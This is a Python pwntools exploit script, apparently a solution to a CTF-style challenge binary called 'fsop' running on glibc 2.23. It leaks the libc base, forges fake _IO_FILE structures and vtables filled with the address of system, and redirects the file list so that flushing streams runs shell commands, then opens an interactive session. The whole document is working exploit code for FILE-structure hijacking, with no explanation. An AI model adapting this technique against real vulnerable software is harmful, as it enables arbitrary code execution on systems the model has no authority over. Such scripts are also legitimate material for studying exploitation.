from pwn import *

context.arch = 'amd64'
#context.terminal = ['tmux', 'neww']
#context.log_level = 'debug'
elf = ELF('./fsop')
libc = ELF('./libc.so.6')

#r = process('./fsop')
r = process(['ld-2.23.so', '--library-path', './', './fsop'])

buf = elf.symbols['buf']
buf2 = elf.symbols['buf2']
tab = elf.symbols['table']
tab2 = elf.symbols['table2']

bss = elf.bss()

print "buf @ ", hex(buf) 


r.recvuntil('@ ')
libc_base = int(r.recvline().strip(), 16) - libc.symbols['_IO_list_all']
system = libc_base + libc.symbols['system']
print "system @ ", hex(system)
printf_plt = elf.symbols['plt.printf']


fd1 = fit({0x00: flat("echo hello"),
	   0x28: flat(1),
	   0x68: flat(buf2),
	   0x90: flat(bss),
	   0xd8: flat(tab)
	}, filler=(ord('\x00'),))

fd2 = fit({0x00: flat('echo world XDD'),
	   0x28: flat(1),
	   0x68: flat(0),
	   0x90: flat(bss),
	   0xd8: flat(tab2)
	}, filler=(ord('\x00'),))


vtable = flat(system)*10
vtable2 = flat(system)*10

r.sendlineafter('buf:', fd1)
r.sendlineafter('buf2:', fd2)
r.sendlineafter('table:', vtable)
r.sendlineafter('table2:', vtable2)
#gdb.attach(r, 'b _IO_flush_all_lockp\nc\nn 16')
r.sendlineafter('addr:', p64(buf))

r.interactive()
